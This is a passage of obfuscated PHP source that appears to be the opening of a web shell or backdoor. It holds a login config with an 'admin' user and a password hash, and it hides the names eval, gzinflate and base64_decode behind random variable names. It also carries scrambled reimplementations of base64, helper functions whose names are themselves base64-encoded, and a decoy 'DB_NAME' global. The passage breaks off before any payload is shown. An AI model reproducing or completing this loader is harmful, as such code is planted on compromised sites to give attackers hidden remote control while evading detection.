...
$QbtvWVWjwejVC = array(
    'uskGJxSBR' => 'admin',
    'paHSXBqYShAyfxcHI' => 'af18fbc896cdec036e37ce80ade25d7f',
    'sadkxrwViRh' => '0',
    'loZtNIo' => '403',
    'shRhSzpZnzT' => '1',
    'poGSaVKzsSoVxfw' => false,
    'cgRNDeWNiZwYvPTn' => true,
);
$hIOQsWAVWhU = 'function_exists';
$EbhngXEKyQ = 'eval';
$JqMMgXqUs = 'gzinflate';
$hMxZfbyQVaz = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
$ZGHWXm = 'substr';
$ksMueGlnaowhPq = 'ord';
$gkPPBnDwTI = 'strlen';
$ysBOsd = 'strpos';
...
$DYXeJjH = 'chr';
$rcjgyE = 'preg_replace';
$IKVhjLZaNGX = '[^A-Za-z0-9\\+\/\=]';
$oDYUKr = '===';
$iOMztR = "";
$ppFNKHmFMj = 'base64_encode';
$IYdVZhOZ = 'base64_decode';
if (!function_exists('base64_encode')) {
    function OEdYXEXJAKC($yivOSkw)
    {
        global $hMxZfbyQVaz, $ZGHWXm, $ksMueGlnaowhPq, $gkPPBnDwTI, $VnyBhrKDtO, $iOMztR, $oDYUKr;
        if (empty($yivOSkw)) return;
        $UFYAj = $gcGWMgTWw = $MIzFWAyttNo = $rjVNxgzaynxle = $HsHheNMeobhFKH = $ZMcMPoEeruNIDKC = $QqqiiRPflTH = $AUfDm = $wMPZasCh = 0;
        $SRezXiDTGzwJzS = 0;
        $zjVKcikOYyFckK = $iOMztR;
        $ObcalRIUPJ = array();
        if (!$yivOSkw) {
            return $yivOSkw;
        }
        do {
            $UFYAj = $ksMueGlnaowhPq($ZGHWXm($yivOSkw, $wMPZasCh++, 1));
            $gcGWMgTWw = $ksMueGlnaowhPq($ZGHWXm($yivOSkw, $wMPZasCh++, 1));
            $MIzFWAyttNo = $ksMueGlnaowhPq($ZGHWXm($yivOSkw, $wMPZasCh++, 1));
            $AUfDm = $UFYAj << 16 | $gcGWMgTWw << 8 | $MIzFWAyttNo;
            $rjVNxgzaynxle = $AUfDm >> 18 & 0x3f;
            $HsHheNMeobhFKH = $AUfDm >> 12 & 0x3f;
            $ZMcMPoEeruNIDKC = $AUfDm >> 6 & 0x3f;
            $QqqiiRPflTH = $AUfDm & 0x3f;
            $ObcalRIUPJ[$SRezXiDTGzwJzS++] = $ZGHWXm($hMxZfbyQVaz, $rjVNxgzaynxle, 1) . $ZGHWXm($hMxZfbyQVaz, $HsHheNMeobhFKH, 1) . $ZGHWXm($hMxZfbyQVaz, $ZMcMPoEeruNIDKC, 1) . $ZGHWXm($hMxZfbyQVaz, $QqqiiRPflTH, 1);
        } while ($wMPZasCh < $gkPPBnDwTI($yivOSkw));
        $zjVKcikOYyFckK = $VnyBhrKDtO($ObcalRIUPJ, $iOMztR);
        $oDleGvubohTm = ($gkPPBnDwTI($yivOSkw) % 3);
        return ($oDleGvubohTm ? $ZGHWXm($zjVKcikOYyFckK, 0, ($oDleGvubohTm - 3)) : $zjVKcikOYyFckK) . $ZGHWXm($oDYUKr, ($oDleGvubohTm || 3));
    }
} else {
    function OEdYXEXJAKC($yivOSkw)
    {
        global $ppFNKHmFMj;
        return $ppFNKHmFMj($yivOSkw);
    }
}
if (!function_exists('base64_decode')) {
    function qqDVlijabETc($xLvbtqE)
    {
        global $hMxZfbyQVaz, $ZGHWXm, $gkPPBnDwTI, $ysBOsd, $DYXeJjH, $rcjgyE, $IKVhjLZaNGX, $iOMztR;
        if (empty($xLvbtqE)) return;
        $jJFIwYqGoqq = $IxDVgQyNwX = $hCVuXBQcRaFWJ = $iOMztR;
        $TAqKRQQjzbKfx = $oQvHxJYuBQUxb = $sBwBSOabsdaTXbq = $pjcNjAYpEebEoB = $iOMztR;
        $wMPZasCh = 0;
        $ISrNCFWZNpt = $iOMztR;
        $xLvbtqE = $rcjgyE($IKVhjLZaNGX, $iOMztR, $xLvbtqE);
        do {
            $TAqKRQQjzbKfx = $ysBOsd($hMxZfbyQVaz, $ZGHWXm($xLvbtqE, $wMPZasCh++, 1));
            $oQvHxJYuBQUxb = $ysBOsd($hMxZfbyQVaz, $ZGHWXm($xLvbtqE, $wMPZasCh++, 1));
            $sBwBSOabsdaTXbq = $ysBOsd($hMxZfbyQVaz, $ZGHWXm($xLvbtqE, $wMPZasCh++, 1));
            $pjcNjAYpEebEoB = $ysBOsd($hMxZfbyQVaz, $ZGHWXm($xLvbtqE, $wMPZasCh++, 1));
            $jJFIwYqGoqq = ($TAqKRQQjzbKfx << 2) | ($oQvHxJYuBQUxb >> 4);
            $IxDVgQyNwX = (($oQvHxJYuBQUxb & 15) << 4) | ($sBwBSOabsdaTXbq >> 2);
            $hCVuXBQcRaFWJ = (($sBwBSOabsdaTXbq & 3) << 6) | $pjcNjAYpEebEoB;
            $ISrNCFWZNpt = $ISrNCFWZNpt . $DYXeJjH((int)$jJFIwYqGoqq);
            if ($sBwBSOabsdaTXbq != 64) {
                $ISrNCFWZNpt = $ISrNCFWZNpt . $DYXeJjH((int)$IxDVgQyNwX);
            }
            if ($pjcNjAYpEebEoB != 64) {
                $ISrNCFWZNpt = $ISrNCFWZNpt . $DYXeJjH((int)$hCVuXBQcRaFWJ);
            }
            $jJFIwYqGoqq = $IxDVgQyNwX = $hCVuXBQcRaFWJ = $iOMztR;
            $TAqKRQQjzbKfx = $oQvHxJYuBQUxb = $sBwBSOabsdaTXbq = $pjcNjAYpEebEoB = $iOMztR;
        } while ($wMPZasCh < $gkPPBnDwTI($xLvbtqE));
        return $ISrNCFWZNpt;
    }
} else {
    function qqDVlijabETc($yivOSkw)
    {
        global $base64_decode;
        return base64_decode($yivOSkw);
    }
}

function __ZW5jb2Rlcg($s)
{
    return OEdYXEXJAKC($s);
}

function __ZGVjb2Rlcg($s)
{
    return qqDVlijabETc($s);
}

$GLOBALS['DB_NAME'] = $GLOBALS['QbtvWVWjwejVC'];
if (true) {
